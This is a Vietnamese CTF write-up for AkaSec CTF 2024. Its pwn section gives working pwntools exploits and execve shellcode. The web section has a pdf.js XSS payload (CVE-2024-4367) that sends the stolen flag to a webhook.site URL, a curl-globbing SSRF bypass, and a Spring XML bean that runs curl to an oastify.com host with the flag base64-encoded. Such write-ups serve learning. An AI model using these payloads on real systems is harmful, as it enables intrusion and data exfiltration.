---
title: "Write up AkaSec CTF 2024"
---

# Binary exploitation
---
## warmup
> bof + one gadget

Flag: `AKASEC{1_Me44444N_J00_C0ULDve_ju57_574CK_p1V07ed}`

Bài này chủ yếu là sử dụng ROP chain để lấy libc rồi gọi `system()`. Nhưng ở đây mình có thể control `$rsp` ở buffer nên mình sẽ dùng one gadget cho nhanh

### Pseudo:
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[64]; // [rsp+0h] [rbp-40h] BYREF

  helper(argc, argv, envp);
  printf("%p\n", &puts);
  printf("name>> ");
  fgets(name, 512, stdin);
  printf("alright>> ");
  fgets(s, 88, stdin);
  puts("okey");
  return 0;
}
```

![image](https://lunaere-3.gitbook.io/~gitbook/image?url=https%3A%2F%2F3296390032-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FJGK9O9RgeCP7yW9iJ1CJ%252Fuploads%252FdN1lmQxT6FkNqi5fM9oQ%252Fimage.png%3Falt%3Dmedia%26token%3Dc9b7f9ea-5c18-47af-8ba6-7d413df432ce&width=768&dpr=1&quality=100&sign=8ffffae2522de4082447e17f589c1b8697e42eb4b3aec39f79e69676d15f2364)

### Checksec:
![image](https://lunaere-3.gitbook.io/~gitbook/image?url=https%3A%2F%2F3296390032-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FJGK9O9RgeCP7yW9iJ1CJ%252Fuploads%252FHiZ2xwWwRQfnvDF3FwRJ%252Fimage.png%3Falt%3Dmedia%26token%3D599d672a-4522-406d-bb5f-df2856072cfd&width=768&dpr=1&quality=100&sign=c232b6d664437e4fc314e1cdfdfa1d87c9eb2de1208b6f1532bc0645e90bc215)

Ta thấy ngay lỗi BOF ở fgets thứ 2, input 88 bytes trong khi biến s chứa có 64.

![image](https://lunaere-3.gitbook.io/~gitbook/image?url=https%3A%2F%2F3296390032-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FJGK9O9RgeCP7yW9iJ1CJ%252Fuploads%252FClUwQnF0Hcu13YIHFDtE%252Fimage.png%3Falt%3Dmedia%26token%3D953ecf9e-f06f-4e83-8fb6-7de0a1e1e2e0&width=768&dpr=1&quality=100&sign=11f47acf47c64468a3ad2ed26afa7e2a5432b0fa308884520aa8f176ec401621)

Có 3 điều có thể thấy:
- `$rbp` bị overwrite ở pattern 64
- `$rsp` ở pattern 72
- **Overwrite được tối đa 0xF bytes (fgets đặt null byte ở cuối)**
-> One gadget là rõ

Nhưng kể cả khi có thể ghi đè stack, nếu ko leak được stack thì cũng chả control được các điều kiện để gọi one gadget (như `rbp - 0x50 == NULL` , `rbp - 0xXX` writeable, ...), vậy HOW?
Biến name được khởi tạo rất lơn, và ta có thể write vào nó (No PIE -> địa chỉ ko random). Ta chỉ đơn giản là input 1 bytes bất kì và 511 bytes còn lại ở name sẽ chứa toàn là 0x00 (NULL).

### 1. Leak libc
Ở ngay đầu chương trình, sau hàm `helper()`, nó đã print cho luôn mình địa chỉ **puts** nên ta chỉ cần trừ đi offset là ra libc base:
```py
puts = int(rl()[0:-1], 16)
libc.address = puts - libc.sym.puts
info(f"Libc: {hex(libc.address)}")
```

### 2. BOF
Sau khi input vào biến `name` bằng "XD":

![image](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FJGK9O9RgeCP7yW9iJ1CJ%2Fuploads%2FQsO3bajsHFdvJrhKBTju%2Fimage.png?alt=media&token=4e5abec8-5f6a-46ca-a741-09ef4a7364f1)

![image](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FJGK9O9RgeCP7yW9iJ1CJ%2Fuploads%2FzDnX9Ie30mhZWfc1CltE%2Fimage.png?alt=media&token=6ae1b099-9a48-4904-b92f-47f88048433c)

Tìm gadget:

![image](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FJGK9O9RgeCP7yW9iJ1CJ%2Fuploads%2F9W5PPrJmmd9gppXeNqE6%2Fimage.png?alt=media&token=a08d5dd1-3409-493d-8d56-5b0cec1df15a)

Payload mẫu:

`payload = padding + (*name + 0xXX) + execve gadget`

***XX: bất cứ giá trị nào sao cho `*name + 0xXX == NULL`**

Full payload:
```py
#!/usr/bin/python3

from pwn import *

exe = ELF('warmup_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
ld = ELF('ld-linux-x86-64.so.2', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            b*0x0000000000401281

        c
        
        ''')
        input()


if args.REMOTE:
    p = remote('172.210.129.230', 1338)
else:
    p = process(exe.path)
# GDB()

puts = int(rl()[0:-1], 16)
libc.address = puts - libc.sym.puts
info(f"Libc: {hex(libc.address)}")

ru(b">>")
sl(b'A')

ru(b">>")
sl(b'A' * 64 + p64(0x4040c0) + p64(libc.address + 0xef52b))

p.interactive()
```
---
## Good_trip
> shellcode + filter

flag: `AKASEC{y34h_You_C4N7_PRO73C7_5om37hIn9_YoU_doN7_h4V3}`

### Pseudo:
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v4; // [rsp+4h] [rbp-Ch] BYREF
  void *buf; // [rsp+8h] [rbp-8h]

  v4 = 0;
  init(argc, argv, envp);
  buf = mmap((void *)0x1337131369LL, 0x1000uLL, 7, 34, -1, 0LL);
  printf("code size >> ");
  __isoc99_scanf("%d", &v4);
  if ( v4 >= 0x1001 )
    return 0;
  printf("code >> ");
  read(0, buf, 0x999uLL);
  mprotect(buf, (int)v4, 5);
  if ( (unsigned __int8)filter(buf) )
  {
    puts("nop, not happening.");
    exit(-1);
  }
  exec(buf);
  return 0;
}
```
```c
__int64 __fastcall filter(__int64 a1)
{
  void *s1[3]; // [rsp+10h] [rbp-20h]
  int v3; // [rsp+28h] [rbp-8h]
  int v4; // [rsp+2Ch] [rbp-4h]

  v4 = -1;
  s1[0] = &unk_402010;
  s1[1] = &unk_402013;
  s1[2] = &unk_402016;
  while ( ++v4 <= 4093 )
  {
    v3 = -1;
    while ( ++v3 <= 2 )
    {
      if ( !memcmp(s1[v3], (const void *)(v4 + a1), 2uLL) )
        return 1LL;
    }
  }
  return 0LL;
}
```

![image](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FJGK9O9RgeCP7yW9iJ1CJ%2Fuploads%2FJ4FVCVXtdgLn0nvJJCdJ%2Fimage.png?alt=media&token=5143d541-21d3-43ae-9de4-ce4b54c24847)

Flow của chương trình:
`mmap -> input shellcode -> mprotect -> filter -> exec`

nôm na là chương trình sẽ chạy shellcode cho chúng ta thôi

Các thanh ghi sau khi jump đến shellcode:

![image](https://lunaere-3.gitbook.io/~gitbook/image?url=https%3A%2F%2F3296390032-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FJGK9O9RgeCP7yW9iJ1CJ%252Fuploads%252FddTPveGqzDG7qURhJrGc%252Fimage.png%3Falt%3Dmedia%26token%3Dc03b3d44-c17b-483a-9a8b-77d388cd7b30&width=768&dpr=1&quality=100&sign=eeea36aae4c2092c3d12fc795282c03aa1c732cf8d70a24031739853d8d2733e)

![image](https://lunaere-3.gitbook.io/~gitbook/image?url=https%3A%2F%2F3296390032-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FJGK9O9RgeCP7yW9iJ1CJ%252Fuploads%252FWZwTH1xHofN0UtBYWcsx%252Fimage.png%3Falt%3Dmedia%26token%3Db4e42557-2bd9-4a0f-94c3-f2c57348d876&width=768&dpr=1&quality=100&sign=4d9849642a1110af8b671ab220c6191f074eb5e85f8dc76ee1cc1af2e329b7c0)

**-> Mục tiêu của chúng ta sẽ là syscall đến execve('/bin/sh', NULL, NULL').**

Đầu tiên là nhét `/bin/sh` vào `$rdi`. Vì `$rdi` phải là pointer đến string `binsh` nên ta phải write vào được đâu đó rồi nhét địa chỉ đó vào `$rdi`. Since mmap của ta sau khi qua hàm mprotect thì chỉ còn bit `r-x`.

Để ý là sau khi tạo mmap, nó sẽ có đủ quyển `rwx`, tiếp theo là write shellcode vào, rồi mới gọi `mprotect`. Nên ý tưởng là ta sẽ nhét thằng string `binsh` vào cuối shellcode để chương trình write vào trước khi mprotect.

Syscall thì ở thanh `$r10` có một địa chỉ sus, khá giống hàm nào đó trong libc. Sau khi test trừ đi offset cố định và check vmmap sử dụng gdb thì ra được libc base.

### Shellcode:
```asm
# offset đến binsh phía cuối
mov rdi, rax
add rdi, 0x21

# clear args
xor rdx, rdx
xor rsi, rsi
xor rbx, rbx

# libc syscall
sub r10, 0x16b6e8
mov rax, 0x3b
```

### Payload:
```py
sla(b'>>', b'999') # size
sla(b'>>', shellcode + p64(29400045130965551))
```
---
## Bad_trip
> shellcode again

flag: `AKASEC{pr3f37CH3M_Li8C_4Ddr35532}`

Chal này vẫn giống bài good trip, nhưng có một vài thay đổi

![image](https://lunaere-3.gitbook.io/~gitbook/image?url=https%3A%2F%2F3296390032-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FJGK9O9RgeCP7yW9iJ1CJ%252Fuploads%252Fb2IUy5SMuo6xbSWrJ17s%252Fimage.png%3Falt%3Dmedia%26token%3Da49bb9e7-cb75-4e9c-8d39-1d4f52d5a14e&width=768&dpr=1&quality=100&sign=c6134a02fe364c564af85e2f0726b2c10a28f35abfeecaab622b4926d9ccd955)

![image](https://lunaere-3.gitbook.io/~gitbook/image?url=https%3A%2F%2F3296390032-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FJGK9O9RgeCP7yW9iJ1CJ%252Fuploads%252FBBCYFUYGozaD4Y5pIeKp%252Fimage.png%3Falt%3Dmedia%26token%3D6d068306-6343-4482-8385-f7ec83b2cae4&width=768&dpr=1&quality=100&sign=27ced187a5401f2d07b5ab6b0bf05281e02f1beac12c893cc236fa8e8755ca8c)

- Code vẫn như cũ, chỉ là không cần input length
- Không có libc leak trên thanh ghi
- Có thêm một vùng nhớ mới có thể write data

Lúc đầu chal cho 4 byte cuối của puts, mình tưởng phải gacha 1 byte sau với libc (7fxx..., xx là byte ko biết) lol, nhưng ko cần.

Ở chal này, thanh `$r13` chứa địa chỉ của stack (lúc này đang chứa env?) trước khi jump tới shellcode, nên ta có thể leak được data trên stack bằng cách trừ `$r13` với offset.

![image](https://lunaere-3.gitbook.io/~gitbook/image?url=https%3A%2F%2F3296390032-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FJGK9O9RgeCP7yW9iJ1CJ%252Fuploads%252F8HVjdhEALWNhIb1cjrSy%252Fimage.png%3Falt%3Dmedia%26token%3Dcce56744-bde4-4332-ad60-afcf8db80e88&width=768&dpr=1&quality=100&sign=94d6e994b9d77dc457c57447d5aa62d5b4e8c91149ad4e4ba3fe2fd715c7face)

yup, và gọi `execve('/bin/sh', NULL, NULL)` như chal trước là được

### Fullpayload:

```py
#!/usr/bin/python3

from pwn import *

exe = ELF('bad_trip_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            b*exec+71

        c
        vmmap
        ''')
        input()


if args.REMOTE:
    p = remote('172.210.129.230', 1352)
else:
    p = process(exe.path)
GDB()
```

### Cách 1: system binsh:

```asm
sub r13, 0x68
mov r13, [r13]
sub r13, 0x2182d0

mov r14, r13
add r14, 0x2646e

mov r8, 0x6969696500
mov r9, 29400045130965551
mov [r8], r9

mov rdi, r8
mov rax, 0x3b
jmp r14
```

### Cách 2: one gadget
```asm
  sub r13, 0x68
  mov r13, [r13]
  sub r13, 0x2182d0
  mov r14, r13
  add r14, 0xdabb3
  mov rbp, 0x6969696500
  mov rsp, 0x6969696500
  push r14
  mov rdi, 0
  ret
```

### Cách 3: libc from xmm register
```asm
  movq r8, xmm1
  sub r8, 0x1d9643
  add r8, 0x2646e
  mov rdi, 0x6969696500
  mov r9, 29400045130965551
  mov [rdi], r9
  mov rax, 0x3b
  jmp r8
```

---
## the_absolute_horror_of_the_trip

Vẫn như các chall trước, các filter đó, nhưng lần này các thanh ghi xmm bị xor hết về 0, và không có thanh ghi nào leak được thông tin

```asm
Dump of assembler code for function exec:
   0x0000559f719a51df <+0>:     push   rbp
   0x0000559f719a51e0 <+1>:     mov    rbp,rsp
   0x0000559f719a51e3 <+4>:     mov    QWORD PTR [rbp-0x8],rdi
   0x0000559f719a51e7 <+8>:     mov    rbx,0x0
   0x0000559f719a51ee <+15>:    mov    rcx,0x0
   0x0000559f719a51f5 <+22>:    mov    rdx,0x0
   0x0000559f719a51fc <+29>:    mov    rsp,0x0
   0x0000559f719a5203 <+36>:    mov    rbp,0x0
   0x0000559f719a520a <+43>:    mov    r8,0x0
   0x0000559f719a5211 <+50>:    mov    r9,0x0
   0x0000559f719a5218 <+57>:    mov    r10,0x0
   0x0000559f719a521f <+64>:    mov    r11,0x0
   0x0000559f719a5226 <+71>:    mov    r12,0x0
   0x0000559f719a522d <+78>:    mov    r13,0x0
   0x0000559f719a5234 <+85>:    mov    r14,0x0
   0x0000559f719a523b <+92>:    mov    r15,0x0
   0x0000559f719a5242 <+99>:    pxor   xmm0,xmm0
   0x0000559f719a5246 <+103>:   pxor   xmm1,xmm1
   0x0000559f719a524a <+107>:   pxor   xmm2,xmm2
   0x0000559f719a524e <+111>:   pxor   xmm3,xmm3
   0x0000559f719a5252 <+115>:   pxor   xmm4,xmm4
   0x0000559f719a5256 <+119>:   pxor   xmm5,xmm5
   0x0000559f719a525a <+123>:   pxor   xmm6,xmm6
   0x0000559f719a525e <+127>:   pxor   xmm7,xmm7
=> 0x0000559f719a5262 <+131>:   jmp    rdi
   0x0000559f719a5264 <+133>:   nop
   0x0000559f719a5265 <+134>:   pop    rbp
   0x0000559f719a5266 <+135>:   ret
```
Nhưng vẫn còn một nơi mà chương trình chưa clear, đó là `$FS`.

![image](https://lunaere-3.gitbook.io/~gitbook/image?url=https%3A%2F%2F3296390032-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FJGK9O9RgeCP7yW9iJ1CJ%252Fuploads%252F7eyiduiPBWPuA3Nae8mS%252Fimage.png%3Falt%3Dmedia%26token%3D5d05343e-f94b-4a76-bba1-1495f5f36ae7&width=768&dpr=1&quality=100&sign=b0dbffbb94d7583551fbc9157b06af7b784f9784a1f97bac847cef94487f42fe)

## shellcode:
```asm
  mov r8, [fs:0]
  add r8, 0x28c0
  add r8, 0x2646e
  mov r10, 29400045130965551
  mov rdi, 0x0000006969696000
  mov [rdi], r10
  mov rax, 0x3b
  jmp r8
```

# Web

## Upload

Nhìn sơ qua thì chall này cung cấp cho mình 2 link, 1 link của chall, 1 link của bot (thực ra là 1, cùng domain nhưng khác route) thì đây chắc chắn là 1 chall về XSS rồi.

![image](https://hackmd.io/_uploads/rJdrGyNBR.png)

Flag giấu ở endpoint `/flag` và chỉ nhận ip từ localhost, port là 5000 cho nên payload XSS của chúng ra phải route con bot đến đây và fetch sang webhook của chúng ta.

Nhưng chall chỉ cho chúng ta upload 1 file dạng pdf sử dụng pdf.js 

![image](https://hackmd.io/_uploads/HJC6MyVHC.png)

Ở đây version của nó là `2.16.105`

![image](https://hackmd.io/_uploads/HyjqXJVBR.png)

nhưng mình tìm được 1 CVE mới diễn ra hồi tháng 5 vừa qua đó là thực thi mã JS bất kì khi sử dụng 1 file PDF độc hại.

![image](https://hackmd.io/_uploads/rJIOmkVrR.png)


Thử upload file pdf độc hại lên check.

![image](https://hackmd.io/_uploads/BJm-4k4BR.png)

Alert đã có. Giờ viết payload sao để flag route đến webhook của mình thôi.

Payload `fetch('/flag').then(response => { return response.json(); }).then\(data => { fetch('https://webhook.site/a7c640b4-bf85-48b3-bfa1-db406cf9d89a', {method: 'POST',mode: 'no-cors',body: JSON.stringify(data)}) })`

![image](https://hackmd.io/_uploads/SJKT41EHA.png)

> Chú ý khi sửa payload trong BurpSuite thì mình phải để các dấu `\` trước các dấu `()`. (Đọc kĩ [PoC](https://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/) để biết tại sao).

Gửi đến con bot: http://127.0.0.1:5000/view/file-1717986450021.pdf

![image](https://hackmd.io/_uploads/rJ1UHyVSR.png)

Flag: `AKASEC{PDF_1s_4w3s0m3_W1th_XSS_&&_Fr33_P4le5T1n3_r0t4t333d_loooool}`


## Proxy For Life 
 
![image](https://hackmd.io/_uploads/SkB6HkVHC.png)

Nhìn preview kiểu này nghĩ ngay đến SSRF đúng không? Tiếp theo đọc source code. 

![image](https://hackmd.io/_uploads/Sk1fLyNH0.png)

Nó sau khi fetch đến URL user cung cấp rồi sẽ đọc response rồi render ra. Nghĩ ngay đến SSTI đúng không? NHƯNG, nhưng 2 lỗ hổng này còn thiếu 1 điều gì đó mới exploit được
1. SSRF: ![image](https://hackmd.io/_uploads/B19F8JErC.png)
Ở đây web sử dụng doyensec để get đến url, 1 công cụ chống SSRF open source, và dùng bản lastest được phát hành từ năm ngoái (v 0.2.1)
2. SSTI: ![image](https://hackmd.io/_uploads/BkIevJVSA.png)
. Hàm renderTemplate này chỉ sử dụng ExecuteTemplate cùng với loại mà nó import `'html/template'` cho nên nó chỉ parse các thẻ html của mình được thôi. Nếu có thì chỉ reflected XSS được thôi.

Sau khi giải kết thúc, người ta mới cung cấp cho mình 1 cái [link](https://pkg.go.dev/net/http/pprof). 
Web này có phần import giống với cái link trên `import _ "net/http/pprof"`, cùng với đoạn sau

![image](https://hackmd.io/_uploads/S1_TPJNrC.png)

Cụ thể thì web sẽ respond với command line của chương trình đang chạy, với các argument ngăn cách nhau bởi dấu null byte. Và dockerfile của chall, flag được register dưới dạng 1 argument khi chạy chương trình.

![image](https://hackmd.io/_uploads/ByYQOkVSA.png)

Route đến /debug/pprof/cmdline, flag is here. 

![image](https://hackmd.io/_uploads/Sk8P_14S0.png)

Flag: `AKASEC{r0t4t3d_p20x1n9_f002_11f3_15n7_92347_4f732_411____}`

## HackerNickName

Chall này sẽ liên quan đến 3 kĩ thuật sau:
1. Set admin thành True thông qua [CVE-2021-25646](https://blog.kuron3k0.vip/2021/04/10/vulns-of-misunderstanding-annotation/)
2. [Curl Globbing](https://everything.curl.dev/cmdline/globbing.html)
3. [Class Instantiation](https://samuzora.com/posts/rwctf-2024/)

### CVE-2021-25646
CVE này liên quan tới việc thư viện Jackson xử lý Json. 
> Jackson là 1 thư viện của java chứa rất nhiều chức năng để đọc và xây dựng JSON. Nó có khả năng ràng buộc dữ liệu mạnh mẽ và cung cấp 1 framework để tuỳ chỉnh quá trình chuyển đổi đối tượng Java sang chuỗi JSON và ngược lại.

```java=
public class User {

    public  String username;

    public String password;

    public String isAdmin="false";

    @JsonCreator
    public User(
            @JsonProperty("username") String username,
            @JsonProperty("password") String password,
            @JacksonInject String isAdmin){
        this.isAdmin=isAdmin;
        this.username=username;
        this.password=password;
    }

    @Override
    public String toString(){
        return this.username+"/"+this.password+"/"+this.isAdmin;
    }
}
```

Bên trên là đoạn code mẫu. Nó sử dụng ba annotation của Jackson 

1. @JsonCreater
> Chúng ta có thể sử dụng @JsonCreater annotation để điều chỉnh constructor được sử dụng trong deserialization
2. @JsonProperty
> Chúng ta có thể thêm @JsonProperty annotation để chỉ ra tên thuộc tính trong JSON.
3. @JacksonInject
> @JacksonInject chỉ ra rằng 1 thuộc tính sẽ lấy giá trị từ việc inject mà không lấy từ JSON data. Nó rất hữu ích khi bạn cần inject các giá trị không có trong dữ liệu JSON vào cá đối tượng Java. Điều này có thể giúp các bạn cấu hình các giá trị mặc định hoặc inject nó trong quá trình deserialization 1 cách dễ dàng. Nghe thì tưởng là các giá trị của trường này user có thể inject vào (như các loại inject vulnerability khác) thông qua dữ liệu người dùng nhưng không, tên gọi của nó cũng khiến mình lúc đầu nghe qua cũng hiểu nhầm. 


Nếu ta truyền vào json như này thì sao `{"username":"admin","password":"1234","":true}`

Kết quả 
```
admin/1234/true

Process finished with exit code 0
```

Trường isAdmin đã được đặt thành true, tại sao khi thêm 1 khóa là 1 chuỗi rỗng với value đặt là true thì isAdmin được gán thành true. Điều này nó liên quan đến việc xử lý logic của Jackson.

Đại khái thì JSON data sẽ được deserizaliation để lấy các giá trị tương ứng rồi gán cho các attribute của class. Sau khi deserialize xong JSON data, nó sẽ gọi đến hàm tạo của User và gán luôn attribute thứ ba của User (isAdmin) thành true luôn. Việc misconfig như vậy có thể gây ra RCE luôn.

Trở lại với challenge, đoạn code để gán user role cũng khá là tương tự với đoạn code mẫu trên. 
![image](https://hackmd.io/_uploads/SkiYDqVrA.png)
Ở đây, author sử dụng role với type là class UserRole như dưới. 
![image](https://hackmd.io/_uploads/HJx_JdqErC.png)

Do việc sử dụng biến role có kiểu dữ liệu là 1 class cho nên khi truyền vào ta cũng phải truyền vào dạng 1 object có cặp key-value là `"admin":True`.

![image](https://hackmd.io/_uploads/ryEKOcVHR.png)
Thực hiện inject như ảnh, ta đã có được role admin. 

### cURL globbing bypass URL checking
#### Preview

![image](https://hackmd.io/_uploads/HyMqt9EBR.png)

Trong admin controller, ta có đoạn check URL như sau

![image](https://hackmd.io/_uploads/H1j5t94SA.png)

Việc bypass đoạn này rất quan trọng để ta đến được route cuối cùng `/ExperimentalSerializer` và nó yêu cầu IP là 127.0.0.1

![image](https://hackmd.io/_uploads/SkXkccVS0.png)

NHƯNG, đoạn code check URL trong admin controller lại yêu cầu mình phải cung cấp 1 URL có host là nicknameservice, port là 5000 nhưng port của web challenge này sử dụng port 8090. Vậy thì phải làm như thế nào?

Chú ý bên dưới, web sử dụng ProcessBuilder với lệnh curl. Và lệnh curl có 1 điều rất thú vị như sau: 
> Khi bạn muốn nhận được nhiều URL gần giống nhau, chỉ 1 phần nhỏ trong số đó thay đổi giữa các yêu cầu. Có thể là 1 dãy số hoặc tập hợp các tên, curl cung cấp 1 tính năng gọi là "globbing" như 1 cách để chỉ định nhiều URL như vậy sử dụng các dấu [] và {}.
> Dấu [] thì nó được sử dụng để yêu cầu 1 phạm vi từ như kiểu là [1-10] hoặc [a-z]. Ví dụ `curl -O "http://example.com/[1-100].png"`
> Còn về dấu {}, nó được sử dụng để chứa các list như kiểu là {one,two,three,four,five}. Ví dụ `curl -O "http://example.com/{one,two,three,alpha,beta}.html"`

Lợi dụng điều này ta có thể đánh lừa việc parseURL của java với payload sau: `http://{127.0.0.1:8090,@nicknameservice:5000/}/`

![image](https://hackmd.io/_uploads/SkFgNsVHR.png)

Bypass được đoạn check URL của admin controller. Tiếp theo ta đến với route `/ExperimentalSerializer`

### Class Instantiation and SPEL Injection 

Tại route này nó sẽ có flow thực hiện như sau

![image](https://hackmd.io/_uploads/Hkn1lFBH0.png)

Nó nhận vào data của mình với argument là serialized, sau đó gán cho biến result bằng kết của của hàm deserialize, method của class ExperimentalSerializer, sau đó thêm vào model 1 attribute mới có tên là result và value là biến result trước đó chuyển về dạng human-readable.

![image](https://hackmd.io/_uploads/HyTB-YrBC.png)

Tại class ExperimentalSerializer, hàm deserialize sẽ thực hiện như sau:
1. Tạo 1 biến có kiểu dữ liệu ObjectMapper, là 1 lớp trong thư viện của Jackson xử lý dữ liệu JSON trong Java. Nó cung cấp các chức năng để chuyển đổi giữa các đối tượng trong Java thành dạng JSON
2. Tạo biến result có là HashMap có key là String và value là Object
3. `List<SerializationItem> dataList = mapper.readValue(serialized, new TypeReference<List<SerializationItem>>() {});`
> Sử dụng ObjectMapper để chuyển đổi dữ liệu JSON thành 1 kiểu dữ liệu TypeReference chứa danh sách các đối tượng `SerializationItem`.
> TypeReference trong thư viện Jackson là 1 lớp giúp giải quyết vấn đề kiểu dữ liệu phức tạp trong Java. Khi deserialize 1 chuỗi JSON thành 1 đối tượng Java, Jackson cần biết kiểu dữ liệu của đối tượng mục tiêu. ĐIều này tương đối dễ dàng với các kiểu đơn giản như String hay int, nhưng đối với các kiểu dữ liệu phức tạp như  `List<SerializationItem>` hoặc `Map<String, List<SerializationItem>>`, ta cần phải sử dụng TypeReference để giữ thông tin chính xác trong quá trình chuyển đổi. 

Lớp SerializationItem sẽ có các thuộc tính sau

![image](https://hackmd.io/_uploads/SyTHVKSrA.png)

4. Sau đó check từng Item trong List vừa mapper có kiểu dữ liệu nào. Ở đây điều mà chúng ta cần quan tâm nhất đó chính là đoạn sau. Đây là 1 cách trong Java để tạo các đối tượng dynamic từ data input.
![image](https://hackmd.io/_uploads/SJW1BYSH0.png)

- Nó thực hiện ngắt các argument bằng dấu `|` trong item.value
- Lấy tên class từ args[0]
- Lấy constructor của lớp vừa tạo bên trên với tham số kiểu String
- Tạo 1 instance của lớp vừa tạo
- Đưa nó vào biến result
    
Author của bài này hướng player đến việc tìm kiếm các gadget là các libraries được load vào trong app, mà cho phép bạn khởi tạo class như kiểu là `constructor.newInstance(args)`

```xml=
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans.xsd">
<bean class="#{T(java.lang.Runtime).getRuntime().exec(
        new String[] {
        '/bin/bash', '-c', 'curl kd11rpy190vlsttafaar26d3xu3lrcf1.oastify.com/?flag=$(/readflag|base64)'
        }
        )}"></bean>
</beans>
```
Payload trên sử dụng `T(class)` rất hữu dụng trong việc khởi tạo class từ các cái tên hợp lệ. Theo đó, mình sẽ khởi tạo 1 class nh`org.springframework.context.support.FileSystemXmlApplicationContext`. Nó sẽ parse external XML sử dụng template processing, cái mà có thể host ở trên server của mình. 
P/s: Phase 3 này liên quan đến khá là nhiều thứ như [CVE-2023-46604](https://vulncheck.com/blog/cve-2023-44604-activemq-in-memory) và SpEL Injection mà mình chưa có research kĩ lắm, cho nên viết cũng chưa được clear. 

Payload khi đưa vào serial sẽ như sau: `[{"type":"object","name":"TypeReference","value":"org.springframework.context.support.FileSystemXmlApplicationContext|' + ATTACKER + '"}]`

Giờ mình sẽ thực hiện lại các bước để giải bài này:

1. ![image](https://hackmd.io/_uploads/SkIeRYSHC.png)
2. ![image](https://hackmd.io/_uploads/HJT2RtBHC.png)
3. ![image](https://hackmd.io/_uploads/BJnIicSSR.png)
4. ![image](https://hackmd.io/_uploads/S1hQlqBrA.png)


# OSINT

## Th3Hun7 1

Flag: AKASEC{Wh4T_a_PfP_:3}

![image](https://github.com/FPTU-Ethical-Hackers-Club/CTF-Writeup/assets/120787381/f11b1e76-740d-4124-bd31-95a30d0362dd)

Ở challenge này, họ yêu cầu ta phải đi tìm Former member của team akasec. Hint ở đây là đáp án không nhất thiết phải ở ctftime.org.

Bước đầu tiên, mình vào trang ctftime.org để xem team này có gì không ?

![image](https://github.com/FPTU-Ethical-Hackers-Club/CTF-Writeup/assets/120787381/a54183d2-6a13-4acf-989b-1c7458bb8fd2)

Mình thấy 3 link là website của ctf, website chính thức và twitter. Lúc này mình vào website chính thức

![image](https://github.com/FPTU-Ethical-Hackers-Club/CTF-Writeup/assets/120787381/e72a2bf5-dee3-4c6b-a33f-f7399babb394)

Mình thấy nó khá bình thường. Vì vậy nên mình vào twitter của team này

![image](https://github.com/FPTU-Ethical-Hackers-Club/CTF-Writeup/assets/120787381/b9242abe-1008-4f2b-8f96-10b9e37e15ec)

Lúc này, mình biết được rằng đây là website mới deploy. Mình đoán là ở trong website này sẽ có gì đó mà tác giải cài cắm, vì thế nên mình xem thử source code của trang web này.

Ở đây mình thấy 1 link twitter, 1 link github và 

``` <img alt="l3ar4nda5" loading="lazy" decoding="async" data-nimg="fill" class="object-cover" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;color:transparent" sizes="100vw" src="/_next/static/media/l3rnds.bbe6448d.jpeg"> ```

Ở đây, rõ ràng đây là phần sus nhất. Vì thế nên mình thử xem src ảnh kia có gì

![image](https://github.com/FPTU-Ethical-Hackers-Club/CTF-Writeup/assets/120787381/e2ee30db-b570-40e5-b6dc-b3e256d855ff)

## Th3Hun7 2

![image](https://github.com/FPTU-Ethical-Hackers-Club/CTF-Writeup/assets/120787381/092484de-086f-44c6-947a-0c4a8d7bd9f5)

Tiếp nối phần 1, dựa theo những dự kiện mình đã có ở phần 2 là github. Mình quyết định vào xem thử github

![image](https://github.com/FPTU-Ethical-Hackers-Club/CTF-Writeup/assets/120787381/edaa3e3e-5447-4432-a1ba-ccc3bbabecf4)

Ở kia có một đoạn morse code

![image](https://github.com/FPTU-Ethical-Hackers-Club/CTF-Writeup/assets/120787381/677afc98-62ef-4b51-b66b-abaf8793f21c)

